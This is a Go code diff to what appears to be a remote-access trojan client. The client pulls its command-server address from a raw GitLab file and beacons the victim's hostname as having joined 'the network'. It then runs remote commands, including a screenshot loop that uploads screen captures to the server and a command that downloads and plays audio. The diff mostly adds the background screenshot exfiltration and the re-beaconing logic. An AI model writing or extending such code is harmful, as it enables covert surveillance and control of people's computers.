@@ -23,9 +23,10 @@ var userInput string = ""
 var mutex sync.Mutex
 var audioCtx *oto.Context
 var readyChan <-chan struct{}
+var screenshotStatus bool = false
 
 func fetchTunnelURL() string {
-	resp, err := http.Get("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt")
+	resp, err := http.Get("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt?t=" + strconv.FormatInt(time.Now().Unix(), 10))
 	if err != nil {
 		fmt.Println("Error fetching gist:", err)
 		return ""
@@ -145,6 +146,16 @@ func playSound(fileName string) {
 	for player.IsPlaying() {
 		time.Sleep(time.Millisecond)
 	}
+	file.Close()
+
+	time.Sleep(3 * time.Second)
+	err = os.Remove(fileName)
+	if err != nil {
+		fmt.Println("Error deleting sound file:", err)
+	}
+
+	fmt.Println("Sound playback started. Deleting sound file...")
+	reportProgress(serverIp, "Sound playback finished.")
 }
 
 func reportProgress(serverURL string, report string) {
@@ -155,6 +166,25 @@ func reportProgress(serverURL string, report string) {
 		return
 	}
 	resp.Body.Close()
+}
+
+func screenshotLoop(amount string) {
+	i := 0
+	fmt.Println("Using numeric value")
+	n, err := strconv.Atoi(amount)
+	if err != nil {
+		fmt.Println(err)
+	}
+	screenshotStatus = true
+	for i < n {
+		ss()
+		output := sendFile("./ss.webp", "image")
+		fmt.Println(output)
+		time.Sleep(500 * time.Millisecond)
+		fmt.Println(i)
+		i++
+	}
+	screenshotStatus = false
 }
 
 func main() {
@@ -179,10 +209,19 @@ func main() {
 	fmt.Println("Tunnel URL fetched:", tunnelURL)
 	fmt.Println("Starting command client...")
 
+	hostname, err := os.Hostname()
+	if err != nil {
+		fmt.Println("Error getting hostname:", err)
+		hostname = "unknown"
+	}
+
+	reportProgress(serverIp, "Client: "+hostname+" has joined the network")
+
 	for true {
 		userInput = fetchCommand()
 		command := strings.Fields(userInput)
 		time.Sleep(2 * time.Second)
+
 		fmt.Printf("Received command from server: %s\n", userInput)
 		if len(command) != 0 {
 			switch command[0] {
@@ -191,23 +230,12 @@ func main() {
 				time.Sleep(5 * time.Second)
 
 			case "ss":
-				i := 0
-				fmt.Println("Using numeric value")
-
-				n, err := strconv.Atoi(command[1])
-
-				if err != nil {
-					fmt.Println(err)
+				fmt.Println("Taking screenshot...")
+				if screenshotStatus {
+					fmt.Println("Screenshot loop already running. Ignoring command.")
+					break
 				}
-
-				for i < n {
-					ss()
-					output := sendFile("./ss.webp", "image")
-					fmt.Println(output)
-					time.Sleep(500 * time.Millisecond)
-					fmt.Println(i)
-					i++
-				}
+				go screenshotLoop(command[1])
 
 			case "sound":
 				fmt.Println("Downloading sound file...")
@@ -218,14 +246,7 @@ func main() {
 				}
 				fmt.Println("Sound file downloaded successfully.")
 				fmt.Println("Playing sound...")
-				playSound(command[1])
-				fmt.Println("Sound playback finished. Deleting sound file...")
-				reportProgress(serverIp, "Sound playback finished.")
-				time.Sleep(1 * time.Second)
-				err = os.Remove(command[1])
-				if err != nil {
-					fmt.Println("Error deleting sound file:", err)
-				}
+				go playSound(command[1])
 
 			default:
 				time.Sleep(2 * time.Second)
@@ -236,13 +257,19 @@ func main() {
 					mutex.Unlock()
 
 					fmt.Println("Server down, looking for new tunnel URL...")
-					time.Sleep(5 * time.Second)
+					time.Sleep(1 * time.Second)
 					tunnelURL = fetchTunnelURL()
-					time.Sleep(5 * time.Second)
-					mutex.Lock()
-					serverIp = tunnelURL
-					mutex.Unlock()
-					fmt.Println("Tunnel URL fetched:", tunnelURL)
+
+					if serverIp != tunnelURL {
+						mutex.Lock()
+						serverIp = tunnelURL
+						mutex.Unlock()
+						fmt.Println("Tunnel URL updated:", tunnelURL)
+						reportProgress(serverIp, "Client: "+hostname+" has joined the network")
+					} else {
+						fmt.Println("Tunnel URL unchanged:", tunnelURL)
+					}
+
 				}
 
 			}
